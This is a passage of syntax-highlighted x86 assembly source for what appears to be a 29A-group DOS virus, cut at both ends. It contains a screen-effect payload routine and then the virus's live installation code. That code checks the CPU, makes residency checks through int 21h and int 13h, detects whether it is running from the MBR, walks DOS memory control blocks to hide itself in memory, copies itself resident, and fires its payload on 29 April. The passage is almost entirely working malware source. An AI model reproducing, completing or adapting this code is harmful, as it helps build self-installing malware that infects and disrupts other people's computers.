        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Change_R</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Move_Row</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">64000d</span><span class="sc4">-</span><span class="sc2">320d</span><span class="sc0">
</span><span class="sc5">Check_Row</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; Backwards so it does not fuck up</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Not_Blank</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">64000d</span><span class="sc1">;-320d</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@Not_Blank</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Check_Side</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">320d</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Just_Do_IT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_NB</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01d</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Just_Do_IT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_NB</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">],</span><span class="sc2">0d</span><span class="sc0">      </span><span class="sc1">; down 2, right +1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@no_2abajoder</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">@no_2abajoder</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">319d</span><span class="sc4">],</span><span class="sc2">0d</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@then_2abajo</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@then_izquierda2abajo</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@@2_derecha</span><span class="sc0">
</span><span class="sc5">@@then_izquierda2abajo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">319d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
</span><span class="sc5">@@then_2abajo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@then_2abajo</span><span class="sc0">
</span><span class="sc5">@@@2_derecha</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
</span><span class="sc5">@then_2abajo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">+</span><span class="sc2">320d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
</span><span class="sc5">@Just_Do_IT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">321d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
</span><span class="sc5">Check_Side</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">322d</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Check_Left</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">@Check_Left</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">320d</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@If_Right</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Select_Side</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@If_Left</span><span class="sc0">
</span><span class="sc5">@Select_Side</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Random_NB</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1d</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Right_Yeah</span><span class="sc0">
</span><span class="sc5">@If_Left</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">320d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">
</span><span class="sc5">@If_Right</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Right_Yeah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">

</span><span class="sc5">@Right_Yeah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">322d</span><span class="sc4">],</span><span class="sc2">15d</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Row</span><span class="sc0">



</span><span class="sc5">Retrace</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3dah</span><span class="sc0">         </span><span class="sc1">; Delay till retrace</span><span class="sc0">
</span><span class="sc5">del1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">del1</span><span class="sc0">
</span><span class="sc5">del2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">del2</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1234h</span><span class="sc0">


</span><span class="sc1">;       Here it starts the code after the payload.</span><span class="sc0">

</span><span class="sc5">we_r_there</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Computer processor below 80286 ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@go_2_end</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7000h</span><span class="sc0">           </span><span class="sc1">; 386+ required, don't hang 80286s</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@no_go_2_end</span><span class="sc0">
</span><span class="sc5">@go_2_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">finished_tsr</span><span class="sc0">
</span><span class="sc5">@@no_go_2_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"_29A"</span><span class="sc0">          </span><span class="sc1">; The virus makes two residence checks.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CACAh</span><span class="sc0">           </span><span class="sc1">; If it's installed in memory by means</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;of the int21h check, it will do nothing.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"RULZ"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@go_2_end</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05bh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@PollaGrandePaTuBoca</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"_POT"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; But if int21h isn't installed, maybe</span><span class="sc0">
                                    </span><span class="sc1">;we've gotta check int13h.</span><span class="sc0">

</span><span class="sc5">@PollaGrandePaTuBoca</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">are_we_on_MBR</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"ALSO"</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Not_in_MBR</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">are_we_on_MBR</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@Not_in_MBR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c001h</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03c57h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@Not_in_MBR</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; ax = 3508h</span><span class="sc0">

                                    </span><span class="sc1">; Maybe we weren't</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int8h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int8h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; ah = 52h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">search_mcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">gotda_mcb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_mcb</span><span class="sc0">

</span><span class="sc5">gotda_mcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">virus_16b</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">finished_tsr</span><span class="sc0">
</span><span class="sc5">@@@FIXTHIS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">virus_16b</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">23h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],(</span><span class="sc5">virus_16b</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],(</span><span class="sc5">virus_16b</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],(</span><span class="sc5">virus_16b</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; To mem</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exec_mem</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">Exec_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">041dh</span><span class="sc0">        </span><span class="sc1">; 29th of April</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Payload</span><span class="sc0">

